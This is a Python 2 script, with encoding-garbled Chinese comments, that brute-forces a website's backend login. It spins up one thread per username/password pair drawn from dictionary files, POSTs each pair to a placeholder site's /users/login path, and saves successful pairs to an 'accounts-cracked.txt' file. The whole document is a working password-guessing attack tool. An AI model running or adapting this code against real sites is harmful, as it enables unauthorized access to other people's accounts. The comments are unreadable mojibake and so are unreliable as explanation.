# -*- coding: utf-8 -*-
# ����python д�Ķ��̱߳��ƺ�̨�û���+����(�Ա��ֵ�),�Ƚ�ʵ��,��ʹ������Ϣ��ȫ��ô���ӵĽ���,�������˲�����֤������쳣��������֮��ĵ�½��֤��ʽ,�����ͺ�# ���ױ�������ƹ�������,(���������ѧϰʵ��,��ֹ����web����,���е���������)
import urllib2
import urllib
import httplib
import threading
 
headers = {"Content-Type":"application/x-www-form-urlencoded",     
           "Connection":"Keep-Alive",
           "Referer":"http://www.xxxxx.com/"};# referer:�Ǵ����ķ�����Դ��ַ
# lock = threading.Lock()
def tryUser(user,password):
    #print user,password
    global headers
    global outFile 
    conn = httplib.HTTPConnection("www.xxxxx.com") # Զ������
    if len(user) < 3:     # �����û������ȣ��ų��ֵ��е���������
        return  # �����˳��߳�
    else:
        #lock.acquire()   # ���̲߳����ļ�����ǰ�������ú��ͷ�
        #line = inFile.readline()
         
        #userData = line.strip().split(' # ') # strip() Ĭ��ȥ���հ��ַ�����' ','\t','\n'��
        #lock.release()
 
        user = user.strip()
        passwd = password.strip()
        params = urllib.urlencode({'username': user, 'password': passwd})
        conn.request(method="POST", url="/users/login", body=params, headers=headers) # ��̨·��
        responseText = conn.getresponse().read().decode('utf8') # ��ҳ����
        #print responseText  # ��һ�ο��Դ�ӡ�����Ƿ����
        if not responseText.find('�û����������벻��ȷ,����������!') > 0 :
            print '----- find user:', user, 'with password:', passwd, '-----'
            outFile.write(user + '    ' +  passwd + '\n')
             
    return
 
outFile = open('accounts-cracked.txt', 'w')
 
if __name__ == '__main__':
    tsk=[] # �����̳߳�
    with open(r'user.dic', 'r') as fUser:  # ʹ��with as �����ļ�,�����Լ��ر��ļ�,��Ϊ�����Լ��ں��ʵ�ʱ�����ѹر�(����C# �е�using(...){}�ӿ�)
        with open(r'pass.dic', 'r') as fPass:
            for user in fUser.readlines():
                for password in fPass.readlines():
                    t= threading.Thread(target = tryUser,args=(user,password))
                    t.daemon = False # ���ò����н����ػ�
                    tsk.append(t) # t.start()
                fPass.seek(0)
                # ��ס����Ҫ���ļ������Ƶ��ļ���,��Ȼ�ͻ����ִֻ�����ѭ���ĵ�һ��,��Ϊ�ڲ���
                # ����֮��(readlines()�ǵ���������ʽ,����һ�κ��ļ�ָ���ָ���ļ�β��,������
                # Ҳ��end��)�ڶ��ξ�û��password �� fPass��,Ҳ����˵ for  password in fPass.readlines():
                # Ϊ��,����������ڲ�ѭ���Ͳ��ᱻִ����,���Ҳ���ǵ��������������(C ++ itertor ����)
                  
                     
# join()�޲���������ȫ�������߳�,�ȴ��߳�ִ���� �в�������˵��
# �����̵߳ȴ�һ���Ͳ������߳���,����ִ�����߳�,�������˼��һ���ӿ�һ���߳�
# ������thread start֮ǰ����join(), ��Ϊjoin() ���߳�����ʱ����
    for t in tsk:
        t.start()
        t.join(1) 
 
 
 
    print "All thread OK,maybe not "
    outFile.close()